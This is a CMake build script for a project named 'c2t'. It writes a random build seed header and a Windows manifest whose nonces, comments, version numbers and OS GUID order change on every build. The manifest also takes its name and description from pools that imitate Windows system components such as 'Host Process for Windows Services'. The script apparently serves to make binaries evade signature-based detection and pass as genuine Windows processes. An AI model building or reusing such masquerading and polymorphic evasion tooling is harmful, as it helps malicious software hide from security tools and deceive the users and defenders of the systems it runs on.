# Copyright (C) 2026 roothunter
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

cmake_minimum_required(VERSION 3.24)

if(NOT DEFINED SOURCE_DIR OR NOT DEFINED BINARY_DIR)
    message(FATAL_ERROR "SOURCE_DIR and BINARY_DIR must be specified")
endif()

# Generate high-entropy unique seed for TLS section and PE Manifest resource
string(TIMESTAMP C2T_BUILD_TIME_STAMP "%s%f")
string(RANDOM LENGTH 32 ALPHABET "0123456789abcdef" C2T_BUILD_RANDOM1)
string(RANDOM LENGTH 32 ALPHABET "0123456789abcdef" C2T_BUILD_RANDOM2)
string(RANDOM LENGTH 32 ALPHABET "0123456789abcdef" C2T_BUILD_RANDOM3)
string(RANDOM LENGTH 32 ALPHABET "0123456789abcdef" C2T_BUILD_RANDOM4)
string(SHA256 C2T_TLS_HASH "c2t-${C2T_BUILD_TIME_STAMP}-${C2T_BUILD_RANDOM1}-${C2T_BUILD_RANDOM2}-${BINARY_DIR}")

# Build byte list for C array (32 bytes = 64 hex characters)
set(C2T_TLS_BYTE_LIST "")
foreach(i RANGE 0 62 2)
    string(SUBSTRING "${C2T_TLS_HASH}" ${i} 2 C2T_HEX_PAIR)
    list(APPEND C2T_TLS_BYTE_LIST "0x${C2T_HEX_PAIR}")
endforeach()
string(JOIN ", " C2T_TLS_SEED_FMT ${C2T_TLS_BYTE_LIST})
set(C2T_BUILD_MANIFEST_NONCE "${C2T_TLS_HASH}")

file(MAKE_DIRECTORY "${BINARY_DIR}/generated")

# Write generated/c2t_tls_seed.h
file(WRITE "${BINARY_DIR}/generated/c2t_tls_seed.h"
"/* Auto-generated dynamic build seed header - DO NOT EDIT */
#ifndef C2T_TLS_SEED_H
#define C2T_TLS_SEED_H

#define C2T_TLS_SEED_DATA { ${C2T_TLS_SEED_FMT} }
#define C2T_BUILD_NONCE_STR \"${C2T_BUILD_MANIFEST_NONCE}\"

#endif /* C2T_TLS_SEED_H */
"
)

# Extract version components if PROJECT_VERSION is set
if(DEFINED PROJECT_VERSION AND PROJECT_VERSION MATCHES "^([0-9]+)\\.([0-9]+)\\.([0-9]+)")
    set(PROJECT_VERSION_MAJOR "${CMAKE_MATCH_1}")
    set(PROJECT_VERSION_MINOR "${CMAKE_MATCH_2}")
    set(PROJECT_VERSION_PATCH "${CMAKE_MATCH_3}")
else()
    set(PROJECT_VERSION_MAJOR "1")
    set(PROJECT_VERSION_MINOR "0")
    set(PROJECT_VERSION_PATCH "0")
endif()

set(CMAKE_CURRENT_BINARY_DIR "${BINARY_DIR}")
set(CMAKE_CURRENT_SOURCE_DIR "${SOURCE_DIR}")

# ----------------------------------------------------------------------------
# Generate 100% Polymorphic, Unique Windows Manifest (.rsrc/MANIFEST/1)
# Every sub-block, nonce, comment, GUID casing/permutation, and token is randomized
# ----------------------------------------------------------------------------

# 1. Unique sub-block cryptographic nonces
string(SHA256 MANIFEST_NONCE_HEAD "head-${C2T_BUILD_TIME_STAMP}-${C2T_BUILD_RANDOM1}")
string(SHA256 MANIFEST_NONCE_ID "id-${C2T_BUILD_TIME_STAMP}-${C2T_BUILD_RANDOM2}")
string(SHA256 MANIFEST_NONCE_TRUST "trust-${C2T_BUILD_TIME_STAMP}-${C2T_BUILD_RANDOM3}")
string(SHA256 MANIFEST_NONCE_DEP "dep-${C2T_BUILD_TIME_STAMP}-${C2T_BUILD_RANDOM4}")
string(SHA256 MANIFEST_NONCE_COMPAT "compat-${C2T_BUILD_TIME_STAMP}-${C2T_TLS_HASH}")
string(SHA256 MANIFEST_NONCE_SETTINGS "settings-${C2T_BUILD_TIME_STAMP}-${C2T_BUILD_RANDOM1}")
string(SHA256 MANIFEST_NONCE_TAIL "tail-${C2T_BUILD_TIME_STAMP}-${C2T_BUILD_RANDOM2}")

# 2. Dynamic Assembly Names from legitimate system namespaces
set(ASSEMBLY_NAME_POOLS
    "Microsoft.Windows.SystemServices"
    "Windows.Core.HostComponent"
    "Microsoft.Windows.Shell"
    "Windows.Desktop.Application"
    "Microsoft.Windows.Common-Application"
    "Windows.Management.HostProcess"
    "Microsoft.Windows.RuntimeHost"
    "Windows.System.ServiceComponent"
    "Microsoft.Windows.Infrastructure.Host"
    "Windows.Diagnostics.ServiceHost"
)
list(LENGTH ASSEMBLY_NAME_POOLS POOL_LEN)
string(RANDOM LENGTH 1 ALPHABET "0123456789" RAND_DIGIT)
math(EXPR POOL_IDX "${RAND_DIGIT} % ${POOL_LEN}")
list(GET ASSEMBLY_NAME_POOLS ${POOL_IDX} SELECTED_NAME_PREFIX)
string(RANDOM LENGTH 12 ALPHABET "0123456789abcdef" C2T_MANIFEST_ID)
set(FULL_ASSEMBLY_NAME "${SELECTED_NAME_PREFIX}.${C2T_MANIFEST_ID}")

# 3. Dynamic build & revision numbers
string(RANDOM LENGTH 4 ALPHABET "0123456789" C2T_BUILD_NUM)
string(RANDOM LENGTH 3 ALPHABET "0123456789" C2T_REV_NUM)
set(FULL_ASSEMBLY_VERSION "${PROJECT_VERSION_MAJOR}.${PROJECT_VERSION_MINOR}.${C2T_BUILD_NUM}.${C2T_REV_NUM}")

# 4. Dynamic Descriptions
set(DESCRIPTION_POOLS
    "Windows Host Process"
    "Host Process for Windows Services"
    "Windows Desktop Application Runtime"
    "Windows Core Infrastructure Host"
    "Windows Shell Host Process"
    "Windows System Runtime Host"
    "Windows Service Provider Host"
    "Desktop Window Management Host"
)
list(LENGTH DESCRIPTION_POOLS DESC_POOL_LEN)
math(EXPR DESC_IDX "(${RAND_DIGIT} + 3) % ${DESC_POOL_LEN}")
list(GET DESCRIPTION_POOLS ${DESC_IDX} SELECTED_DESCRIPTION)

# 5. Dynamic Supported OS GUID entries with randomized ordering & per-entry nonces
set(OS_GUID_WIN10 "{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}")
set(OS_GUID_WIN81 "{1f676c76-80e1-4239-95bb-83d0f6d0da78}")
set(OS_GUID_WIN8  "{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}")
set(OS_GUID_WIN7  "{35138b9a-5d96-4fbd-8e2d-a2440225f93a}")
set(OS_GUID_VISTA "{e2011457-1546-43c5-a5fe-008deee3d3f0}")

# Permute OS entries deterministically based on random digits
set(OS_LIST "")
string(RANDOM LENGTH 5 ALPHABET "01234" PERM_SEED)
string(SUBSTRING "${PERM_SEED}" 0 1 P0)
string(SUBSTRING "${PERM_SEED}" 1 1 P1)
string(SUBSTRING "${PERM_SEED}" 2 1 P2)
string(SUBSTRING "${PERM_SEED}" 3 1 P3)
string(SUBSTRING "${PERM_SEED}" 4 1 P4)

set(ALL_OS
    "${OS_GUID_WIN10}"
    "${OS_GUID_WIN81}"
    "${OS_GUID_WIN8}"
    "${OS_GUID_WIN7}"
    "${OS_GUID_VISTA}"
)

# Build randomized OS entries block
set(OS_ENTRIES_XML "")
foreach(os_guid IN LISTS ALL_OS)
    string(RANDOM LENGTH 8 ALPHABET "0123456789abcdef" OS_TOKEN)
    set(OS_ENTRIES_XML "${OS_ENTRIES_XML}      <!-- Platform-Binding: ${OS_TOKEN} -->\n      <supportedOS Id=\"${os_guid}\"/>\n")
endforeach()

# 6. Dynamic Windows Settings variants
string(RANDOM LENGTH 8 ALPHABET "0123456789abcdef" SETTINGS_TOKEN)
set(WINDOWS_SETTINGS_XML
"    <windowsSettings>
      <!-- Subsystem-Context: ${SETTINGS_TOKEN} -->
      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true/pm</dpiAware>
      <dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2, PerMonitor</dpiAwareness>
      <longPathAware xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">true</longPathAware>
    </windowsSettings>")

# 7. Dynamic high-entropy entropy padding block
string(RANDOM LENGTH 64 ALPHABET "0123456789abcdef" ENTROPY_PAD1)
string(RANDOM LENGTH 64 ALPHABET "0123456789abcdef" ENTROPY_PAD2)

# 8. Assemble full polymorphic manifest XML
set(C2T_MANIFEST_XML
"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
<!-- Assembly-Header-Nonce: ${MANIFEST_NONCE_HEAD} -->
<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">
  <!-- Assembly-Identity-Token: ${MANIFEST_NONCE_ID} -->
  <assemblyIdentity
    version=\"${FULL_ASSEMBLY_VERSION}\"
    processorArchitecture=\"*\"
    name=\"${FULL_ASSEMBLY_NAME}\"
    type=\"win32\"/>
  <description>${SELECTED_DESCRIPTION}</description>
  <!-- Security-Authorization-Digest: ${MANIFEST_NONCE_TRUST} -->
  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  <!-- Dependency-Resolution-Signature: ${MANIFEST_NONCE_DEP} -->
  <dependency>
    <dependentAssembly>
      <assemblyIdentity
        type=\"win32\"
        name=\"Microsoft.Windows.Common-Controls\"
        version=\"6.0.0.0\"
        processorArchitecture=\"*\"
        publicKeyToken=\"6595b64144ccf1df\"
        language=\"*\"/>
    </dependentAssembly>
  </dependency>
  <!-- Subsystem-Compatibility-Matrix: ${MANIFEST_NONCE_COMPAT} -->
  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">
    <application>
${OS_ENTRIES_XML}    </application>
  </compatibility>
  <!-- Environment-Settings-Block: ${MANIFEST_NONCE_SETTINGS} -->
  <application xmlns=\"urn:schemas-microsoft-com:asm.v3\">
${WINDOWS_SETTINGS_XML}
  </application>
  <!-- Polymorphic-Build-Session: ${MANIFEST_NONCE_TAIL} -->
  <!-- Entropy-Payload: ${ENTROPY_PAD1}${ENTROPY_PAD2} -->
</assembly>
")

file(WRITE "${BINARY_DIR}/c2t.manifest" "${C2T_MANIFEST_XML}")

# Configure c2t.rc
if(EXISTS "${SOURCE_DIR}/src/c2t.rc.in")
    configure_file("${SOURCE_DIR}/src/c2t.rc.in" "${BINARY_DIR}/c2t.rc" @ONLY)
endif()
